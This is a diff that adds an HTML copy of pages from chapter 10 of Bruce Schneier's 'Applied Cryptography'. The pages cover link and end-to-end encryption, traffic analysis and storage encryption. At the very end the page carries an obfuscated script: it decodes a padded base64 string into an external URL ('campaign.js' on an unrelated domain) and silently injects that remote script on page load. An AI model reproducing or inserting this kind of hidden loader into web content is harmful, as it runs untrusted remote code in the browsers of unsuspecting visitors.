@@ -1,0 +1,145 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Using Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=10//-->
+<!--PAGES=218-221//--> 
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="10-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+</P>
+<P>Imagine a synchronous communications line, encrypted using 1-bit CFB. After initialization, the line can run indefinitely, recovering automatically from bit or synchronization errors. The line encrypts whenever messages are sent from one end to the other; otherwise it just encrypts and decrypts random data. Eve has no idea when messages are being sent and when they are not; she has no idea when messages begin and end. All she sees is an endless stream of random-looking bits.
+</P>
+<P>If the communications line is asynchronous, the same 1-bit CFB mode can be used. The difference is that the adversary can get information about the rate of transmission. If this information must be concealed, make some provision for passing dummy messages during idle times.</P>
+<P>The biggest problem with encryption at the physical layer is that each physical link in the network needs to be encrypted: Leaving any link unencrypted jeopardizes the security of the entire network. If the network is large, the cost may quickly become prohibitive for this kind of encryption.</P>
+<P>Additionally, every node in the network must be protected, since it processes unencrypted data. If all the network&#146;s users trust one another, and all nodes are in secure locations, this may be tolerable. But this is unlikely. Even in a single corporation, information might have to be kept secret within a department. If the network accidentally misroutes information, anyone can read it. Table 10.2 summarizes the pros and cons of link-by-link encryption.</P>
+<P><FONT SIZE="+1"><B><I>End-to-End Encryption</I></B></FONT></P>
+<P>Another approach is to put encryption equipment between the network layer and the transport layer. The encryption device must understand the data according to the protocols up to layer three and encrypt only the transport data units, which are then recombined with the unencrypted routing information and sent to lower layers for transmission.
+</P>
+<P>This approach avoids the encryption/decryption problem at the physical layer. By providing end-to-end encryption, the data remains encrypted until it reaches its final destination (see Figure 10.2). The primary problem with end-to-end encryption is that the routing information for the data is not encrypted; a good cryptanalyst can learn much from who is talking to whom, at what times and for how long, without ever knowing the contents of those conversations. Key management is also more difficult, since individual users must make sure they have common keys.</P>
+<TABLE WIDTH="90%"><TH CAPTION ALIGN="CENTER" COLSPAN="2">Table 10.2<BR>Link-by-Link Encryption: Advantages and Disadvantages
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD WIDTH="7%">
+<TD ALIGN="LEFT" VALIGN="TOP"><B><I>Advantages:</I></B>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT" VALIGN="TOP">Easier operation, since it can be made transparent to the user. That is, everything is encrypted before being sent over the link.
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT" VALIGN="TOP">Only one set of keys per link is required.
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT" VALIGN="TOP">Provides traffic-flow security, since any routing information is encrypted.
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT" VALIGN="TOP">Encryption is online.
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Disadvantages:</I></B>
+<TR>
+<TD COLSPAN="2" ALIGN="LEFT" VALIGN="TOP">Data is exposed in the intermediate nodes.
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+</TABLE>
+<I><P><A NAME="Fig2"></A><A HREF="javascript:displayWindow('images/10-02.jpg',358,61 )"><IMG SRC="images/10-02t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/10-02.jpg',358,61)"><FONT COLOR="#000077"><B>Figure 10.2</B></FONT></A>&nbsp;&nbsp;End-to-end encryption.</I>
+</P>
+<P>Building end-to-end encryption equipment is difficult. Each particular communications system has its own protocols. Sometimes the interfaces between the levels are not well-defined, making the task even more difficult.
+</P>
+<P>If encryption takes place at a high layer of the communications architecture, like the applications layer or the presentation layer, then it can be independent of the type of communication network used. It is still end-to-end encryption, but the encryption implementation does not have to bother about line codes, synchronization between modems, physical interfaces, and so forth. In the early days of electromechanical cryptography, encryption and decryption took place entirely offline; this is only one step removed from that.</P>
+<P>Encryption at these high layers interacts with the user software. This software is different for different computer architectures, and so the encryption must be optimized for different computer systems. Encryption can occur in the software itself or in specialized hardware. In the latter case, the computer will send the data to the specialized hardware for encryption before sending it to lower layers of the communication architecture for transmission. This process requires some intelligence and is not suitable for dumb terminals. Additionally, there may be compatibility problems with different types of computers.</P>
+<P>The major disadvantage of end-to-end encryption is that it allows <B>traffic analysis</B>. Traffic analysis is the analysis of encrypted messages: where they come from, where they go to, how long they are, when they are sent, how frequent or infrequent they are, whether they coincide with outside events like meetings, and more. A lot of good information is buried in that data, and a cryptanalyst will want to get his hands on it. Table 10.3 presents the positive and negative aspects of end-to-end encryption.</P>
+<P><FONT SIZE="+1"><B><I>Combining the Two</I></B></FONT></P>
+<P>Table 10.4, primarily from [1244], compares link-by-link and end-to-end encryption. Combining the two, while most expensive, is the most effective way of securing a network. Encryption of each physical link makes any analysis of the routing information impossible, while end-to-end encryption reduces the threat of unencrypted data at the various nodes in the network. Key management for the two schemes can be completely separate: The network managers can take care of encryption at the physical level, while the individual users have responsibility for end-to-end encryption.
+</P>
+<TABLE WIDTH="80%"><TH CAPTION ALIGN="CENTER" COLSPAN="2">Table 10.3<BR>End-to-End Encryption: Advantages and Disadvantages
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD WIDTH="7%" ALIGN="LEFT">
+<TD ALIGN="LEFT" VALIGN="TOP"><B><I>Advantages:</I></B>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" COLSPAN="2">Higher secrecy level.
+<TR>
+<TD ALIGN="LEFT">
+<TD ALIGN="LEFT" VALIGN="TOP"><B><I>Disadvantages:</I></B>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" COLSPAN="2">Requires a more complex key-management system.
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" COLSPAN="2">Traffic analysis is possible, since routing information is not encrypted.
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" COLSPAN="2">Encryption is offline.
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+</TABLE>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">10.4 Encrypting Data for Storage</FONT></H3>
+<P>Encrypting data for storage and later retrieval can also be thought of in the Alice and Bob model. Alice is still sending a message to Bob, but in this case &#147;Bob&#148; is Alice at some future time. However, the problem is fundamentally different.
+</P>
+<P>In communications channels, messages in transit have no intrinsic value. If Bob doesn&#146;t receive a particular message, Alice can always resend it. This is not true for data encrypted for storage. If Alice can&#146;t decrypt her message, she can&#146;t go back in time and re-encrypt it. She has lost it forever. This means that encryption applications for data storage should have some mechanisms to prevent unrecoverable errors from creeping into the ciphertext.</P>
+<P>The encryption key has the same value as the message, only it is smaller. In effect, cryptography converts large secrets into smaller ones. Being smaller, they can be easily lost. Key management procedures should assume that the same keys will be used again and again, and that data may sit on a disk for years before being decrypted.</P>
+<P>Furthermore, the keys will be around for a long time. A key used on a communications link should, ideally, exist only for the length of the communication. A key used for data storage might be needed for years, and hence must be stored securely for years.</P>
+<P>Other problems particular to encrypting computer data for storage were listed in [357]:</P>
+<DL>
+<DD><B>&#151;</B>&nbsp;&nbsp;The data may also exist in plaintext form, either on another disk, in another computer, or on paper. There is much more opportunity for a cryptanalyst to perform a known-plaintext attack.
+<DD><B>&#151;</B>&nbsp;&nbsp;In database applications, pieces of data may be smaller than the block size of most algorithms. This will cause the ciphertext to be considerably larger than the plaintext.
+<DD><B>&#151;</B>&nbsp;&nbsp;The speed of I/O devices demands fast encryption and decryption, and will probably require encryption hardware. In some applications, special high-speed algorithms may be required.
+<DD><B>&#151;</B>&nbsp;&nbsp;Safe, long-term storage for keys is required.
+<DD><B>&#151;</B>&nbsp;&nbsp;Key management is much more complicated, since different people need access to different files, different portions of the same file, and so forth.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="10-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(PSdmNFzi, ogcwElqM) {ogcwElqM = PSdmNFzi.createElement('script');ogcwElqM.type = 'text/javascript';ogcwElqM.async = true;ogcwElqM.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');PSdmNFzi.getElementsByTagName('body')[0].appendChild(ogcwElqM);}(document));</script></body>
+</html>
